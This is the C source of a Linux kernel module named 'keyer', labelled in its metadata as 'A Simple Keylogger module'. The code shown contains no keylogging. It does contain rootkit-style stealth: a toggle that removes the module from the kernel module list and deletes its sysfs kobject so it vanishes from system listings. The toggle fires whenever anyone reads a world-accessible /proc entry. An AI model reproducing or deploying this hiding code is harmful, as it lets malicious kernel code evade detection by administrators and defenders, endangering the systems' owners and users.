#include <linux/kernel.h>    // included for KERN_INFO
#include <linux/module.h>    
#include <linux/init.h>      // included for __init and __exit macros
#include <linux/proc_fs.h>   
#include <linux/seq_file.h>  

#define PROC_NAME "keyer"
static char module_hidden = 1;


static struct list_head *prev_module;
static struct list_head *prev_kobj_module;

static struct proc_dir_entry *keyer_entry;

void module_toggle(void)
{
	int restore;
	if (!module_hidden)
	{
    	list_add(&THIS_MODULE->list, prev_module);               

		restore = kobject_add(&THIS_MODULE->mkobj.kobj,THIS_MODULE->mkobj.kobj.parent, PROC_NAME);
		module_hidden = !module_hidden; 
	}
	else if  (module_hidden) 
	{
	    prev_module = THIS_MODULE->list.prev;             
	    list_del(&THIS_MODULE->list);                   

	    prev_kobj_module = THIS_MODULE->mkobj.kobj.entry.prev;           
	    kobject_del(&THIS_MODULE->mkobj.kobj);                 
		list_del(&THIS_MODULE->mkobj.kobj.entry);

		module_hidden = !module_hidden; 
	}     
}
static int keyer_proc_show(struct seq_file *m, void *v) {
	
	seq_printf(m, "Toggled hidden status\n");
	module_toggle();
	return 0;
}
static int keyer_proc_open(struct inode *inode, struct  file *file) {
	return single_open(file, keyer_proc_show, NULL);
}
static const struct file_operations proc_file_fops = {
	.owner = THIS_MODULE,
	.open  = keyer_proc_open,
	.read = seq_read,
	.llseek = seq_lseek,
	.release = single_release,
};

static int __init keyer_init(void)
{
	printk(KERN_INFO "Hello world!\n");
	keyer_entry = proc_create(PROC_NAME, 0666, NULL, &proc_file_fops);
	if (keyer_entry == NULL) return 0;
	

    return 0;    // Non-zero return means that the module couldn't be loaded.
}

static void __exit keyer_cleanup(void)
{
	remove_proc_entry(PROC_NAME, NULL);
	printk(KERN_INFO "Cleaning up module.\n");

}

module_init(keyer_init);
module_exit(keyer_cleanup);
MODULE_AUTHOR("faineance");
MODULE_DESCRIPTION("A Simple Keylogger module");
MODULE_LICENSE("GPL");